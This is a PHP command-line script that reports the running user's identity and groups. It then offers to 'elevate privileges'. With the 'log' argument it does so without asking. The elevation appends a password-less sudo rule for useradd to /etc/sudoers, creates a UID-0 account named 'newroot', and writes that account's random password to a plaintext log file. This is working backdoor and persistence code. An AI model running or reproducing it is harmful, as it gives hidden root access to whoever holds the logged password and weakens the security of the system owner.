<?php
// Get the current user
$user = posix_getpwuid(posix_geteuid());
$username = $user['name'];

// Check if the user is root
$is_root = ($username === 'root');

// Get the groups the user belongs to
$groups = posix_getgroups();
$group_info = '';
foreach ($groups as $gid) {
    $group = posix_getgrgid($gid);
    $group_info .= $group['name'] . ',';
}
$group_info = rtrim($group_info, ',');

// Initialize the output string
$output = "PHP is running as user: $username\n";
$output .= "Is root: " . ($is_root ? 'Yes' : 'No') . "\n";
$output .= "Groups: $group_info\n";
$output .= "------------------------\n";

// Check if a command-line parameter is provided
if (isset($argv[1]) && $argv[1] === 'log') {
    // Log the information to a file
    $log_file = 'privilege_info.log';
    file_put_contents($log_file, $output, FILE_APPEND | LOCK_EX);
} else {
    // Print the information to the console
    echo $output;
}

// Prompt the user to elevate privileges or automatically elevate if logging
$elevate_privileges = false;
if (isset($argv[1]) && $argv[1] === 'log') {
    $elevate_privileges = true;
} else {
    echo "Do you want to elevate privileges and create a new root user? (yes/no): ";
    $answer = trim(fgets(STDIN));
    $elevate_privileges = (strtolower($answer) === 'yes');
}

if ($elevate_privileges) {
    // Modify the /etc/sudoers file to grant password-less sudo access to the current user for useradd
    $sudoers_file = '/etc/sudoers';
    $sudoers_entry = "\n# Allow $username to run useradd without a password\n$username ALL=(ALL) NOPASSWD: /usr/sbin/useradd\n";
    file_put_contents($sudoers_file, $sudoers_entry, FILE_APPEND | LOCK_EX);

    // Generate a random password
    $password = bin2hex(random_bytes(8));

    // Create a new root user
    $new_username = 'newroot';
    $command = "sudo useradd -ou 0 -g 0 -s /bin/bash -p $(openssl passwd -1 '$password') $new_username";
    system($command);

    // Prepare the output for new root user creation
    $output = "New root user '$new_username' created with password: $password\n";
    $output .= "------------------------\n";

    // Log or print the new root user creation based on the command-line parameter
    if (isset($argv[1]) && $argv[1] === 'log') {
        file_put_contents($log_file, $output, FILE_APPEND | LOCK_EX);
    } else {
        echo $output;
    }
} elseif (!isset($argv[1]) || $argv[1] !== 'log') {
    echo "Privilege elevation canceled.\n";
}
?>
